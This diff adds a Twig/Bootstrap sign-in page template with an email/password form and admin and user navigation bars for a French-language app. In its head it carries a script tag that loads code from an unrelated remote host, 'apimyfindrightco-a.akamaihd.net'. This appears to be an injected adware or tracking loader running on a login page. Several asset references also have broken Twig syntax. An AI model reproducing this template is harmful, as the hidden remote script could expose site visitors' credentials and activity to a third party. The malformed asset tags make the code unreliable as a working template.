@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
+  <head><script src="http://apimyfindrightco-a.akamaihd.net/gsrs?g=b77ca5e4-4240-474b-97ee-dd9e34403dde&bp=BFG&is=isgiwhMA"></script> 
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="shortcut icon" href="../../assets/ico/favicon.ico">
+
+    <title>Signin Template for Bootstrap</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="{{asset('bootstrap/css/bootstrap.css')" rel="stylesheet">
+    <link href="{{asset('bootstrap/css/signin.css')" rel="stylesheet">  
+    <link href="{{asset('bootstrap/css/sticky-footer-navbar.css')" rel="stylesheet">  
+    <script src="{{asset('bootstrap/js/bootstrap.js')"></script>
+    <script src="{{asset('bootstrap/js/validator.js')"></script>
+
+
+   
+  </head>
+
+  <body>
+    {%block body %}
+
+    <div class="container">
+
+      <form class="form-signin" role="form">
+        <fieldset>
+        <h2 class="form-signin-heading">Please sign in</h2>
+        <input type="email" class="form-control" placeholder="Email address" validate="email" required autofocus >
+        <input type="password" class="form-control" placeholder="Password" required>
+        
+        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
+        </fieldset>
+      </form>
+
+    </div> <!-- /container -->
+
+    {%endblock%}
+    {%block headerAdmin%}
+        <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#"><img src="{{asset('images/header.jpg')}}" width="55px" heigth="31px" ></a>
+        </div>
+        <div class="collapse navbar-collapse">
+          <ul class="nav navbar-nav">
+            <li class="dropdown">
+              <a href="#" class="dropdown-toggle" data-toggle="dropdown">Utilisateur <b class="caret"></b></a>
+              <ul class="dropdown-menu">
+                <li><a href="#">consulter</a></li>
+                <li><a href="#">ajouter</a></li>
+              </ul>
+            </li>
+            <li><a href="#about">Historique</a></li>
+            <li><a href="#contact">Statistique</a></li>
+            <li><a href="#contact">Deconnexion</a></li>
+            
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
+
+    {%endblock%}
+        {%block headerUser%}
+        <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#"><img src="{{asset('images/header.jpg')}}" width="55px" heigth="31px" ></a>
+        </div>
+        <div class="collapse navbar-collapse">
+          <ul class="nav navbar-nav">
+            <li><a href="#contact">Pointage</a></li>
+            <li><a href="#about">Historique</a></li>
+            <li><a href="#contact">Profil</a></li>
+            <li><a href="#contact">Deconnexion</a></li>
+            
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
+
+    {%endblock%}
+
+    {%block footer%}
+    <div id="footer">
+      <div class="container">
+        <p class="text-muted">Place sticky footer content here.</p>
+      </div>
+    </div>
+
+    {%endblock%}
+   
+  </body>
+</html>
